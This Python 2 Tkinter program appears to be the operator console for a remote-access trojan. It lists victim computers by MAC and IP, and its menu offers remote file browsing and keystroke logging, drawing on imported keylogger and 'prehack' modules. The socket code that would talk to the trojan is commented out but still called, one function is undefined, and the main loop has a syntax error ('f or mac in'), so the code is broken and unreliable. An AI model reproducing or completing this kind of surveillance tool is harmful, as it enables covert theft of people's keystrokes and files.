# -*- coding:utf-8 -*-
import dirlister
from Tkinter import *
import os
import pro
import findfl
import keylogger
import prehack
import socket
global connect_flag
connect_flag=1 #up线
global connect_dict #靳然的key （mac 和ip )
global mac_now
mac_now=""
connect_dict={"0C84DC":"10.8.87.121","1010101":"10.8.21.35","0C84Dd":"10.8.87.121"}#在线的电脑
computer_dict={"0C84DC":"10.8.87.121","1010101":"10.8.21.35","0C84Dd":"10.8.87.121","0C84DCa":"10.8.87.121","0C84DC7":"10.8.87.121","0C84DC8":"10.8.87.121","0C84DC9":"10.8.87.121","0C84DC4":"10.8.87.121","0C584DC":"10.8.87.121"}


# client_address = ('10.204.35.53', 8900)  # 木马端地址
#
#     # Create aTCP/IP socket
#
# sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#
#     # Connect thesocket to the port where the server is listening
#
# print>> sys.stderr, 'connecting to %s port %s' % client_address

# def connect_socket():
#
#     sock.connect(client_address)
#     sock.send("keyboard open")
#     sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#
#     # Connect thesocket to the port where the server is listening
#
#     print>> sys.stderr, 'connecting to %s port %s' % client_address
#
#     sock2.connect(client_address)
#
#     i=0
#     while i<5:#UI里输入叉叉
#
#         data = sock2.recv(1024)
#         #if sock2.send()=="[Escape]":
#         if data =="[Escape]":
#
#             break
#         print(data)
#         i=i+1
#     sock.send("keyboard close")
#
# #def receive_local()
#
# def file_connect(message_file):
#     sock.connect(client_address)
#     sock.send(message_file)
#     sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#
#     # Connect thesocket to the port where the server is listening
#
#     print>> sys.stderr, 'connecting to %s port %s' % client_address
#
#     # sock2.connect(client_address)
#     # sock2.send(message_file)
#     # while True:
#     #
#     #     message_file = pro_find_run()
#     #     print("lllllllllllllllllllllllllllllllllllllllllllll")
#     #     print(message_file)
#     #     sock2.send(message_file)  # 设置
#     #     data = sock2.recv(1024)
#     #     print(data)
#     #     if data =="[Escape]":
#     #
#     #         break
#     #     print(data)
#     #
#     #
#     # #sock.send("keyboard close")
#     # sock.send("findfile close")
#     # print"ok"

def show_info_page():
    return 0

def do_what():#判断任务
    global mac_now
    print(var_grid.get()) #判断选择了什么任务
    # if (u.get() == '' or is_legal(u.get())==0):#输入为空或不合法


    #connect_dict=prehack.connect_list()     #所有在线的东西
    # if (connect_dict.has_key(mac_now)==True):
    #     connect_flag=1#连接成功
    #     print("success"+mac)
    # else:
    #     connect_flag=0
    #     print("down")
    if (var_grid.get() == 3):##没有选择任务
        show_info_page()#提醒选择任务
        return -1
    if var_grid.get() == 0 :#调用文件实时查询功能函数
        #if connect_flag==1:

        file_connect("findfile open")
        #file_connect()
        pro.pro_find_run()

        # else:
        #     file_from_github()
            #pro.disconnect_inform()#下线提醒，无法调用
    if var_grid.get() == 1 :#键盘记录函数
        if connect_flag==1:
            connect_socket()

            #sock.send("find file open")
            #keylogger.run()
        else:

            key_from_github()

            #pro.disconnect_inform()#下线提醒
        # if connect_flag == 2:
        #     file_connect()
    else:#连接github查询
        #open_github()
        pass

def show_info_page():
    page = Toplevel()
    page.title('提示')
    page.geometry('200x200')
    Label(page, text='请选择任务').pack()

def profile_find_run():
    root = Tk()
    root.title("file chooser")
    root.geometry("530x340")

    var = StringVar()
    fl = []
    isf = [FALSE]

    def print_item(event):
        s = lb.get(lb.curselection())
        if isf[0] == TRUE:
            fl.pop()
        fl.append(s)
        p = '\\'.join(fl)
        if findfl.GetFileList(p) != 0:
            if '\\' not in p:
                p += '\\'
            lb.delete(0, END)
            for item in findfl.GetFileList(p):
                lb.insert(END, item)
            lb.bind('<ButtonRelease-1>', print_item)
        else:
            isf[0] = TRUE
        var2.set(p)  # 设置文本框中的值

    lb = Listbox(root, listvariable=var, height=15, width=90)
    list_item = []
    if findfl.GetFileList('c:\\') != 0:
        list_item.append('c:')
    if findfl.GetFileList('d:\\') != 0:
        list_item.append('d:')
    if findfl.GetFileList('e:\\') != 0:
        list_item.append('e:')
    if findfl.GetFileList('f:\\') != 0:
        list_item.append('f:')
    if findfl.GetFileList('g:\\') != 0:
        list_item.append('g:')
    for item in list_item:
        lb.insert(END, item)
    lb.bind('<ButtonRelease-1>', print_item)
    lb.pack()

    var2 = StringVar()
    e = Entry(root, textvariable=var2, width=90)
    e.pack()  # 这里的side可以赋值为LEFT  RTGHT TOP  BOTTOM

    def ok():
        print var2.get()
        root.destroy()

    def cancel():
        root.destroy()

    def goback():
        if isf[0] == TRUE:
            fl.pop()
            isf[0] = FALSE
        if fl:
            fl.pop()
            p = '\\'.join(fl)
            if '\\' not in p:
                p += '\\'
            lb.delete(0, END)
            for item in findfl.GetFileList(p):
                lb.insert(END, item)
            lb.bind('<ButtonRelease-1>', print_item)
            var2.set(p)  # 设置文本框中的值
            if p == '\\':
                lb.delete(0, END)
                for item in list_item:
                    lb.insert(END, item)
                lb.bind('<ButtonRelease-1>', print_item)
            if not fl:
                var2.set(" ")

    # icon = PhotoImage(file = 'C:\\Users\\yu\\Documents\\workspace\\nasd\\qwr.gif')
    Button(root, text="OK", height=1, width=8, command=ok).pack(side=RIGHT, padx=10)
    Button(root, height=1, width=8, text="Cancel", command=cancel).pack(side=LEFT, padx=10)
    Button(root, height=1, width=8, text="Last", command=goback).pack(side=LEFT)

    root.mainloop()  # 进入消息循环
    return 0


master = Tk()
var_grid = IntVar()

var_grid.set(3)
#Label(master, text="First").grid(sticky=E)
#Label(master, text="Second").grid(sticky=E)

#e1 = Entry(master)
#e2 = Entry(master)

#e1.grid(row=0, column=1)
#e2.grid(row=1, column=1)

#checkbutton = Checkbutton(master, text='Preserve aspect', variable=var)
#checkbutton.grid(columnspan=2, sticky=W)



#photo = PhotoImage(file='computer1.gif')
#label = Label(image=photo)
#label.image = photo
#label.grid(row=0, column=2, columnspan=2, rowspan=2, sticky=W+E+N+S, padx=5, pady=5)
N=20
button={}
com_background= "computer2.gif"

img = PhotoImage(file=com_background)
#此处需要靳然的key（mac 和Ip）
#connect_dict=jr()
i=0
f or mac in computer_dict.keys():
    i=i+1
    button_name = "计算机" + str(i)
    mac_now=mac
    print(mac_now)
    # button[i] = Button(root, text="计算机1", command=dirlister.run, width=5).pack(side=BOTTOM)
    button[i] = Button(master, text=button_name, image=img, compound="right", anchor="w", command=do_what,bitmap="error").grid(row=i/5,column=i%5,sticky="N")

select1 = Radiobutton(master, text="文件查询", variable=var_grid, value=0)

select1.grid(columnspan=5, rowspan=2)
select2 = Radiobutton(master, text="键盘记录", variable=var_grid, value=1)
select2.grid(columnspan=5, rowspan=2)
select3 = Radiobutton(master, text="记录查询", variable=var_grid, value=2)
select3.grid(columnspan=5, rowspan=2)
#lfc_field_1_t_sv =Scrollbar(master, orient=VERTICAL)  # 文本框-竖向滚动条
#lfc_field_1_t_sh =Scrollbar(master, orient=HORIZONTAL)  # 文本框-横向滚动条

mainloop()


